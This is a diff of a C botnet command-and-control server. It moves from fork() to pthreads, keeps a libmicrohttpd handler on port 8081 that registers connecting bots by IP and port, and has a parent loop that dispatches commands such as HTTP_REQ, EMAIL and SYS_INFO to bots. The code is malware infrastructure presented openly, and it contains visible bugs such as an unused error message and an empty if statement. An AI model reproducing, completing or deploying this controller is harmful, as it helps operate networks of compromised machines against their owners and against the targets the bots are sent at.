@@ -33,7 +33,7 @@ int list_botnet(int active);
 void sendCommand(char *command, int bot_id);
 int initializeSemaphores();
 int closeSemaphores();
-void parent(int pid);
+void parent(/*int pid*/);
 void child();
 void hello();
 int registerBot(const char *bot_ip, const char *bot_port);
@@ -42,45 +42,11 @@ int setBotInfo(long *bot_port, char *bot_ip, int bot_id);
 int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
                    const char *method, const char *version, const char *upload_data,
                    size_t *upload_data_size, void **con_cls);
-void initSHM();
+
 
 void updateBotInfo(int bot_id, char *target_ip, char *command);
 
-int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
-                   const char *method, const char *version, const char *upload_data,
-                   size_t *upload_data_size, void **con_cls)
-{
-    const char *msg = "OK";
-    struct MHD_Response *response;
-    int ret;
 
-    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
-    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
-
-    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
-    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);
-
-    long port = atol(bot_port);
-    struct in_addr address;
-    inet_pton(AF_INET, bot_ip, &(address));
-
-    if (findBot(address, port) == -1)
-    {
-
-        ret = registerBot(bot_ip, bot_port);
-
-        if (ret < 0)
-        {
-            const char *msg = "NOT OK";
-        }
-        printf("Bot Connected \n");
-    }
-
-    list_botnet(1);
-    MHD_destroy_response(response);
-
-    return ret;
-}
 // ! ########################################################### MAIN ######################################################################################
 int main(int argc, char const *argv[])
 {
@@ -88,8 +54,8 @@ int main(int argc, char const *argv[])
     int pid;
 
     initializeSemaphores();
-    initSHM();
 
+    
     botnet = (active_bots *)malloc(sizeof(active_bots));
     if (botnet == NULL)
     {
@@ -97,32 +63,34 @@ int main(int argc, char const *argv[])
     }
     botnet->next = NULL;
     botnet->bot_id = 0;
+    
 
-    pid = fork();
-    if (pid < 0)
-    {
-        handle_error("cannot fork");
-    }
-    else if (pid == 0)
-    {
-        if (DEBUG)
-            printf("Child process working,handle bot connection \n");
+     pthread_t* threads = (pthread_t*)malloc(2 * sizeof(pthread_t));
+        
+        //parent
+		if (pthread_create(&threads[0], NULL, parent,NULL) != 0) {
+			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
+			exit(EXIT_FAILURE);
+		}
+        //child
+		if (pthread_create(&threads[1], NULL, child, NULL) != 0) {
+			fprintf(stderr, "Can't create a new thread, error %d\n", errno);
+			exit(EXIT_FAILURE);
+		}
 
-        child();
-    }
-    else
-    {
-        printf("Parent process working, send commands \n");
 
-        parent(pid);
-    }
+        for (int i = 0; i < 2; i++){
+		pthread_join(threads[i], NULL);
+
+        }
+
 
     return 0;
 }
 // ! ########################################################### PARENT ######################################################################################
-void parent(int pid)
+void parent(/*int pid*/)
 {
-    
+
     while (1)
     {
 
@@ -146,15 +114,16 @@ void parent(int pid)
             {
                 handle_error("Failed to close semaphores");
             }
-            
 
             MHD_stop_daemon(mhd_daemon);
 
-            kill(pid, SIGKILL);
+            // kill(pid, SIGKILL);
 
             exit(EXIT_SUCCESS);
         }
-        else if (strcmp(command,"\n") == 0) {}
+        else if (strcmp(command, "\n") == 0)
+        {
+        }
         // maybe just one or multiple | statements
 
         else if (strcmp(command, HTTP_REQ) == 0 | strcmp(command, EMAIL) == 0 | strcmp(command, SYS_INFO) == 0)
@@ -193,7 +162,6 @@ void parent(int pid)
 void child()
 {
 
-    
     const union MHD_ConnectionInfo *conninfo;
 
     mhd_daemon = MHD_start_daemon(MHD_USE_SELECT_INTERNALLY, 8081, NULL, NULL, &handle_request, NULL, MHD_OPTION_END);
@@ -481,10 +449,11 @@ int closeSemaphores()
     if (ret < 0)
         handle_error("Cannot close sem w");
 
-
     close(fd_shm);
-    if(munmap(botnet,sizeof(active_bots)));
-    if(shm_unlink(SHM_NAME)) handle_error("errore SHM_UNLINK");
+    if (munmap(botnet, sizeof(active_bots)))
+        ;
+    if (shm_unlink(SHM_NAME))
+        handle_error("errore SHM_UNLINK");
 
     return ret;
 }
@@ -693,19 +662,38 @@ void updateBotInfo(int bot_id, char *target_ip, char *command)
     }
 }
 
-void initSHM(){
+int handle_request(void *cls, struct MHD_Connection *connection, const char *url,
+                   const char *method, const char *version, const char *upload_data,
+                   size_t *upload_data_size, void **con_cls)
+{
+    const char *msg = "OK";
+    struct MHD_Response *response;
+    int ret;
 
-    shm_unlink(SHM_NAME);
-    fd_shm=shm_open(SHM_NAME,O_CREAT|O_RDWR,0666);
-    if(fd_shm==-1) handle_error("errore shm_open");
+    response = MHD_create_response_from_buffer(strlen(msg), (void *)msg, MHD_RESPMEM_PERSISTENT);
+    ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
 
-    ret=ftruncate(fd_shm,sizeof(active_bots));
-    if(ret) handle_error("errore truncate");
+    const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
+    const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);
 
-    // botnet=mmap(0,sizeof(active_bots),PROT_READ|PROT_WRITE,MAP_SHARED,fd_shm,0);
-    // if(botnet==MAP_FAILED) handle_error("errore mmap");
+    long port = atol(bot_port);
+    struct in_addr address;
+    inet_pton(AF_INET, bot_ip, &(address));
 
-    // memset(botnet,0,sizeof(active_bots));   
+    if (findBot(address, port) == -1)
+    {
 
+        ret = registerBot(bot_ip, bot_port);
 
+        if (ret < 0)
+        {
+            const char *msg = "NOT OK";
+        }
+        printf("Bot Connected \n");
+    }
+
+    list_botnet(1);
+    MHD_destroy_response(response);
+
+    return ret;
 }
